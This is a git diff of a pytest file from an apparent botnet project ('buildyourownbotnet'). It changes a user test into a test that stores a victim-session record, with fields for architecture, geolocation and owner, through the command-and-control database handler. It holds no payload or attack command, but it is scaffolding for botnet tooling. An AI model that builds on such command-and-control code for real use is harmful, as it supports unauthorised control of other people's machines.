@@ -1,9 +1,9 @@
-
 import pytest
 import uuid
 from datetime import datetime
-from buildyourownbotnet import bcrypt
-from buildyourownbotnet.models import User, Session, Payload
+from buildyourownbotnet import app, db, bcrypt
+from buildyourownbotnet.core import database
+from buildyourownbotnet.models import User, Session
 
 
 @pytest.fixture(scope='module')
@@ -17,22 +17,15 @@ def new_user():
         db.session.commit()
     return user
 
-def test_new_user():
+def test_new_session(new_user):
     """
     Given a new user,
-    when a new user is created, 
-    then check the username and hashed password are defined correctly.
+    when a new user is created and a new session is added for that usesr,
+    then check the session is associated with that only that user correctly.
     """
-    test_username = 'test_user'
-    hashed_password = bcrypt.generate_password_hash('test_password').decode('utf-8')
-    new_user = User(username=test_username, password=hashed_password)
-    assert new_user.username == 'test_user'
-    assert new_user.password != 'test_password'
-
-def test_new_session(new_user):
+    # add test session
     uid = str(uuid.uuid4())
-    session_dict = {
-            "id": 1,
+    input_session_dict = {
 			"uid": uid,
 			"online": True,
 			"joined": datetime.utcnow(),
@@ -47,10 +40,15 @@ def test_new_session(new_user):
 			"architecture": 'x32',
 			"latitude": 0.00,
 			"longitude": 0.00,
-			"owner": new_user.username
+			"owner": new_user.username,
     }
-    session = Session(**session_dict)
-    assert isinstance(session, Session)
-    assert session.id == 1
-    assert session.uid == uid
-    assert session.owner == new_user.username
+    output_session_dict = database.handle_session(input_session_dict)
+
+    # run tests
+    session = Session.query.filter_by(uid=uid)
+    assert len(session.all()) == 1
+    assert session.first().owner == new_user.username
+    
+    # clean up
+    session.delete()
+    db.session.commit()
